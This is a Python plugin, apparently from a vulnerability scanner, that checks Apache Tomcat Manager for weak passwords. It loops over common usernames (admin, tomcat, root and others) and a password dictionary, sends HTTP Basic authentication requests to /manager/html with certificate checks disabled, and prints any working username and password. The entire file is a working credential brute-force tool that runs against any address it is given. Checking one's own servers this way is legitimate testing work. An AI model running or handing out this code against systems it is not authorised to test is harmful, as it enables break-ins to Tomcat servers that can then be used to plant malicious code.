# -*- coding:utf-8 -*-

import re
import urllib.request, urllib.error, urllib.parse
import base64
from exp.lib.gla import getpassdict
import ssl

ssl._create_default_https_context = ssl._create_unverified_context

def verify(protocol,ip,port):
    url = protocol+'://'+ip+':'+str(port)
    print('testing if tomcat weak pass vul')
    error_i = 0
    flag_list = ['/manager/html/reload', 'Tomcat Web Application Manager']
    user_list = ['admin', 'manager', 'tomcat', 'apache', 'root']
    passdictarr = getpassdict()
    psw = passdictarr.get_pass_dict()
    psw.append('tomcat')
    psw.append(' ')
    for user in user_list:
        for pass_ in psw:
            try:
                pass_ = str(pass_.replace('{user}', user))
                login_url = url + '/manager/html'
                request = urllib.request.Request(login_url)
                auth_str_temp = user + ':' + pass_
                auth_str = base64.b64encode(auth_str_temp.encode(encoding='utf-8'))
                request.add_header('Authorization', 'Basic ' + auth_str.decode())
                res = urllib.request.urlopen(request, timeout=10)
                res_code = res.code
                res_html = res.read().decode('utf-8','ignore')
            except urllib.error.HTTPError as e:
                res_code = e.code
                try:
                    res_html = e.read().decode('utf-8','ignore')
                except Exception:
                    res_html = ''
            except urllib.error.URLError as e:
                error_i += 1
                if error_i >= 3:
                    msg = 'Therer is no tomcat weakpass vul in url:' +login_url+'.'
                    number = 'v0'
                    return False,url,number,msg
                continue
            if int(res_code) == 404 or int(res_code) == 502:
                msg = 'Therer is no tomcat weakpass vul in url:' +login_url+'.'
                number = 'v0'
                return False,url,number,msg
            if int(res_code) == 401 or int(res_code) == 403:
                continue
            for flag in flag_list:
                if flag in res_html:
                    msg = 'Found tomcat weakpass vul in url:'+login_url+' with username and password: '+user+' and password: '+pass_+' .'
                    print(msg)
                    number = 'v46'
                    return True,url,number,msg
                else:
                    pass
    msg = 'Therer is no tomcat weakpass vul in url:' +login_url+'.'
    number = 'v0'
    return False,url,number,msg



